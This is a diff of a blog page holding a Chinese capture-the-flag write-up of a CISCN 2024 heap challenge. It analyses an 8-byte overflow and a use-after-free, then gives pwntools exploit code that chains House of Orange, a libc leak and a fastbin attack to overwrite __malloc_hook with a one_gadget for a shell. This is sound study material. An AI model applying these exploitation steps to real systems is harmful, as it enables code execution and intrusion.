@@ -19,12 +19,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap,wp">
     
     <meta name="description" content="">
-    <meta name="description" content="题目内容IDA 分析，经典的堆题，保护全开，四个选项增删改查。 add：1234567891011121314151617181920212223__int64 add()&amp;#123;  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]  printf(&quot;Please input the length of the diary content:&quot;);  v1 &#x3D; inp">
+    <meta name="description" content="题目内容 IDA 分析，经典的堆题，保护全开，四个选项增删改查。 add： 1234567891011121314151617181920212223__int64 add()&amp;#123;  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]  printf(&quot;Please input the length of the diary content:&quot;);  v1 &#x3D; i">
 <meta property="og:type" content="article">
 <meta property="og:title" content="How2Heap实战(1)——CISCN2024orange_cat_diary">
 <meta property="og:url" content="http://example.com/2024/07/18/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="题目内容IDA 分析，经典的堆题，保护全开，四个选项增删改查。 add：1234567891011121314151617181920212223__int64 add()&amp;#123;  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]  printf(&quot;Please input the length of the diary content:&quot;);  v1 &#x3D; inp">
+<meta property="og:description" content="题目内容 IDA 分析，经典的堆题，保护全开，四个选项增删改查。 add： 1234567891011121314151617181920212223__int64 add()&amp;#123;  int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]  printf(&quot;Please input the length of the diary content:&quot;);  v1 &#x3D; i">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-07-17T16:55:15.000Z">
 <meta property="article:modified_time" content="2024-09-01T01:16:05.360Z">
@@ -498,30 +498,38 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h1><p>IDA 分析，经典的堆题，保护全开，四个选项增删改查。</p>
-<h2 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the diary content:&quot;</span>);</span><br><span class="line">  v1 = input_8byte();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The diary content exceeds the maximum length allowed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Memory allocation failed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  diary_size = v1;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter the diary content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, diary_size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary addition successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h1>题目内容</h1>
+<p>IDA 分析，经典的堆题，保护全开，四个选项增删改查。</p>
+<h2 id="add：">add：</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the diary content:&quot;</span>);</span><br><span class="line">  v1 = input_8byte();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The diary content exceeds the maximum length allowed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Memory allocation failed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  diary_size = v1;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter the diary content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, diary_size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary addition successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>限制最大分配字节数0x1000，然后用ptr（全局变量）保存返回的堆指针，diary_size（全局变量）保存我们输入的大小。没有漏洞。</p>
-<h2 id="edit：溢出8字节"><a href="#edit：溢出8字节" class="headerlink" title="edit：溢出8字节"></a>edit：溢出8字节</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the diary content:&quot;</span>);</span><br><span class="line">  v1 = input_8byte();</span><br><span class="line">  <span class="keyword">if</span> ( diary_size + <span class="number">8</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)v1 )      <span class="comment">// 允许溢出8字节？</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The diary content exceeds the maximum length allowed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter the diary content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary modification successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="edit：溢出8字节">edit：溢出8字节</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the diary content:&quot;</span>);</span><br><span class="line">  v1 = input_8byte();</span><br><span class="line">  <span class="keyword">if</span> ( diary_size + <span class="number">8</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)v1 )      <span class="comment">// 允许溢出8字节？</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The diary content exceeds the maximum length allowed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter the diary content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, ptr, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary modification successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>可以修改ptr指向的区域的对应内容，观察检查，允许我们超出diary_size 8个字节写，存在小规模的堆溢出，正好可以覆盖size域，修改邻近高地址chunk的size。</p>
-<h2 id="delete：UAF"><a href="#delete：UAF" class="headerlink" title="delete：UAF"></a>delete：UAF</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( free_once &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    --free_once;  <span class="comment">// 不对，这个块永远相邻topchunk，没法进unsorted bin</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary deletion successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="delete：UAF">delete：UAF</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( free_once &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    --free_once;  <span class="comment">// 不对，这个块永远相邻topchunk，没法进unsorted bin</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary deletion successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>释放ptr指向的chunk。free_once是一个静态的变量，值为1，也就是说程序只允许我们free一次。另外存在UAF，ptr在free后不置空。</p>
-<h2 id="show："><a href="#show：" class="headerlink" title="show："></a>show：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( read_once &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(ptr, <span class="number">1uLL</span>, diary_size, <span class="built_in">stdout</span>);</span><br><span class="line">    --read_once;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary view successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="show：">show：</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( read_once &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(ptr, <span class="number">1uLL</span>, diary_size, <span class="built_in">stdout</span>);</span><br><span class="line">    --read_once;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Diary view successful.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>打印ptr指向区域diary_size大小的内容，同理，只允许我们泄露一次。</p>
 <p>考虑每次分配都会写一次ptr和diary_size，也就意味着程序只能UAF和读取最近一次分配的堆块。</p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目名字都提示了，肯定是要用一次house of orange的。我们必须好好利用仅有的一次释放和一次读机会。<br>我们能够启动攻击的入手点就在那个8字节的溢出和最近分配chunk的UAF。溢出字节只有8写不了fd和bk指针，很多攻击手段就失效了。最近分配chunk的UAF操作和唯一一次free大概率是要用于getshell的任意地址写，所以联想题目名字，泄露地址肯定是house of orange后分配chunk再读。<br>然后getshell使用一个能任意地址分配的方法，思路采用fastbin attack将chunk 分配到<code>__malloc_hook</code>附近写为onegadget即可。</p>
-<h1 id="操作过程和问题解决"><a href="#操作过程和问题解决" class="headerlink" title="操作过程和问题解决"></a>操作过程和问题解决</h1><h2 id="House-of-Orange与fencepost-chunk"><a href="#House-of-Orange与fencepost-chunk" class="headerlink" title="House of Orange与fencepost chunk"></a>House of Orange与fencepost chunk</h2><p>第一步用house of orange将原本的top放进unsorted bin中</p>
+<h1>思路</h1>
+<p>题目名字都提示了，肯定是要用一次house of orange的。我们必须好好利用仅有的一次释放和一次读机会。<br>
+我们能够启动攻击的入手点就在那个8字节的溢出和最近分配chunk的UAF。溢出字节只有8写不了fd和bk指针，很多攻击手段就失效了。最近分配chunk的UAF操作和唯一一次free大概率是要用于getshell的任意地址写，所以联想题目名字，泄露地址肯定是house of orange后分配chunk再读。<br>
+然后getshell使用一个能任意地址分配的方法，思路采用fastbin attack将chunk 分配到<code>__malloc_hook</code>附近写为onegadget即可。</p>
+<h1>操作过程和问题解决</h1>
+<h2 id="House-of-Orange与fencepost-chunk">House of Orange与fencepost chunk</h2>
+<p>第一步用house of orange将原本的top放进unsorted bin中</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#--------------House of Orange----------------------</span></span><br><span class="line">evil_size=<span class="number">0xfe1</span> <span class="comment">#page aligned</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 0, 0x20</span></span><br><span class="line">edit(<span class="number">0x20</span>,(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(evil_size)))<span class="comment"># overflow</span></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># now topchunk is in unsorted bin</span></span><br><span class="line"><span class="comment">#--------------House of Orange----------------------</span></span><br></pre></td></tr></table></figure>
-
 <p>奇怪的是，这里动调的时候发现在申请0x1000的chunk后，原来的旧top chunk最高地址处被切了两个0x10的小chunk出来，同时放入unsorted bin的旧top的size也减少了0x20。</p>
 <p>这里是因为<code>sysmalloc</code>函数的缘故。这个函数在处理旧top的时候插入了两个2*SIZE_SZ的围栏(fencepost)边界块，用来防止不同内存区域的错误合并。libc源代码的操作如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_size != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">     enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">  set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">     old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">     intentional. We need the fencepost, even if old_top otherwise gets</span></span><br><span class="line"><span class="comment">     lost.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line">  chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line">  <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">  <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>注意上面的两次对chunk_at_offset的size的写入，在释放old_top前创建了两个fencepost块，我们也不用过多管是出于什么目的，反正能对上源码，知道这是sysmalloc在释放oldtop前做的操作就可以了</p>
-<h2 id="unsortedbin-leak-libc，切割old-top"><a href="#unsortedbin-leak-libc，切割old-top" class="headerlink" title="unsortedbin leak libc，切割old top"></a>unsortedbin leak libc，切割old top</h2><blockquote>
-<p>这里的地址泄露困扰了我很久<br>这时，unsorted bin里的旧top的fd和bk指向main_arena+88的偏移位置，由于我们等下要用UAF来实现任意地址分配，所以这里的泄露只能通过从旧chunk中切一个新的再读来实现。我们随便分配一个差不多大小的chunk，malloc会从这个unsorted bin中的old_top切一块给我们。然后读一下内容就行了。</p>
+<h2 id="unsortedbin-leak-libc，切割old-top">unsortedbin leak libc，切割old top</h2>
+<blockquote>
+<p>这里的地址泄露困扰了我很久这时，unsorted bin里的旧top的fd和bk指向main_arena+88的偏移位置，由于我们等下要用UAF来实现任意地址分配，所以这里的泄露只能通过从旧chunk中切一个新的再读来实现。我们随便分配一个差不多大小的chunk，malloc会从这个unsorted bin中的old_top切一块给我们。然后读一下内容就行了。</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">b&#x27;1&#x27;</span>)<span class="comment"># 将old top 取出来，里面此时有main_arena地址信息 fd末尾写成0x31</span></span><br><span class="line">show()</span><br><span class="line">largebin_addr=u64(p.recvuntil(<span class="string">b&quot;Diary view successful.\n&quot;</span>)[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">main_arena_offset=libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]+<span class="number">0x10</span></span><br><span class="line">libc_addr=largebin_addr-<span class="number">0x610</span>-<span class="number">88</span>-main_arena_offset</span><br></pre></td></tr></table></figure>
-
 <p>但是很抽象的是，读取出来的地址并不对，我们能发现读出来的chunk有四个字段都被写了，fd_nextsize和bk_nextsize也被写了。其fd和bk存储的内容发生了变化，不是main_arena+0x58。而被切后仍然留在unsorted bin中的old_top，其fd和bk仍然不变。这是为什么？我们怎么利用读出来的这个地址？</p>
 <p>动调了一下，结合ida反汇编的libc文件对照汇编代码以及libc源码终于发现是什么问题了。我们知道malloc在发现fastbin和smallbin不满足的时候会进入一个大循环处理unsorted bin中的chunk，在这里有猫腻。</p>
 <p>现在的old_top显然是一个large chunk，因此malloc在循环处理中先将它整个放进了large bin，在其中发生了写操作，将fd和bk，fd_nextsize和bk_nextsize都重新写了。也就是我们后面读出来的fd和bk其实是指向BINS数组中相应大小largebin的位置。操作如下（largebin为空的情况下）：</p>
@@ -532,16 +540,22 @@
 <p>remainder的fd和bk</p>
 </blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">remainder = chunk_at_offset (victim, nb);</span><br><span class="line"><span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">  have to perform a complete insert here.  */</span></span><br><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">remainder-&gt;bk = bck;</span><br><span class="line">remainder-&gt;fd = fwd;</span><br><span class="line">bck-&gt;fd = remainder;</span><br><span class="line">fwd-&gt;bk = remainder;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">&#123;</span><br><span class="line">  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 切割后返回的size是正常的</span></span><br><span class="line">set_head (victim, nb | PREV_INUSE |</span><br><span class="line">  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
-<h2 id="fastbin-attack-alloc-2-malloc-hook"><a href="#fastbin-attack-alloc-2-malloc-hook" class="headerlink" title="fastbin attack: alloc 2 malloc_hook"></a>fastbin attack: alloc 2 malloc_hook</h2><p>拿到了libc基地址随便嗯造就行。这里我们要把一个fastbin大小的堆块分配在malloc_hook附近。但是光改fd不够，我们要在malloc_hook低地址处找到一个合法的size域来构建我们的phantom_chunk.</p>
+<h2 id="fastbin-attack-alloc-2-malloc-hook">fastbin attack: alloc 2 malloc_hook</h2>
+<p>拿到了libc基地址随便嗯造就行。这里我们要把一个fastbin大小的堆块分配在malloc_hook附近。但是光改fd不够，我们要在malloc_hook低地址处找到一个合法的size域来构建我们的phantom_chunk.</p>
 <p>这其实有个技巧基础，因为libc的基地址大多以0x7f打头，因此我们可以利用字节错位+小端序的特点来找到一个合适的0x7f的size域来通过malloc对fastbin分配的检查（只检查size和第一个是否double free）。动调看一下内存，果然有（见下方exp注释部分）。这个0x7f在mallochook-0x13的位置，算上prev_size，要减0x23。</p>
 <p>分配一个真实size 0x70大小的chunk（申请0x68），然后UAF写其fd为<code>malloc_hook-0x23</code>，连续申请两次0x68大小的chunk，第二次申请出的就是malloc_hook附近的chunk了。接下来直接edit（0x13是因为malloc肯定返回的是跳过size的可写部分），写入one_gadget后随便申请一个chunk就能getshell了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fast bin attack</span></span><br><span class="line">malloc_hook_addr=libc_addr+libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] <span class="comment"># 拿下，正确地址！</span></span><br><span class="line">one_gadget=libc_addr+<span class="number">0xf03a4</span></span><br><span class="line"><span class="comment"># x /64bx 0x7f815bf9aae0</span></span><br><span class="line"><span class="comment"># 0x7f815bf9aae0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9aae8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9aaf0: 0x60    0x92    0xf9    0x5b    0x81    0x7f    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9aaf8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9ab00 &lt;__memalign_hook&gt;:       0xa0    0xbe    0xc5    0x5b    0x81    0x7f    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9ab08 &lt;__realloc_hook&gt;:        0x70    0xba    0xc5    0x5b    0x81    0x7f    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9ab10 &lt;__malloc_hook&gt;: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></span><br><span class="line"><span class="comment"># 0x7f815bf9ab18: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></span><br><span class="line">phantom_chunk=malloc_hook_addr-<span class="number">0x23</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>) <span class="comment">#0x70  为了0x7f size满足</span></span><br><span class="line">delete()</span><br><span class="line"><span class="comment"># 字节错位伪造size</span></span><br><span class="line">edit(<span class="number">8</span>,p64(phantom_chunk)) <span class="comment"># UAF制造fake fd</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment"># place at phantom</span></span><br><span class="line">edit(<span class="number">0x13</span>+<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(libc_addr+<span class="number">0xf03a4</span>))<span class="comment"># overwrite __malloc_hook</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="技巧总结："><a href="#技巧总结：" class="headerlink" title="技巧总结："></a>技巧总结：</h1><ul>
-<li>溢出长度足够8字节的情况下，house of orange的一次额外free机会</li>
-<li>leak libc地址，malloc不清空chunk内容，但是要注意fd和bk写的是什么，对main_arena+88算下偏移</li>
-<li>fastbin attack的利用是基于在malloc_hook附近申请并分配一个0x70大小chunk（利用0x7f的字节错位来伪造一个0x70的fastbin范围内的size域）。</li>
+<h1>技巧总结：</h1>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>溢出长度足够8字节的情况下，house of orange的一次额外free机会</p>
+</li>
+<li class="lvl-2">
+<p>leak libc地址，malloc不清空chunk内容，但是要注意fd和bk写的是什么，对main_arena+88算下偏移</p>
+</li>
+<li class="lvl-2">
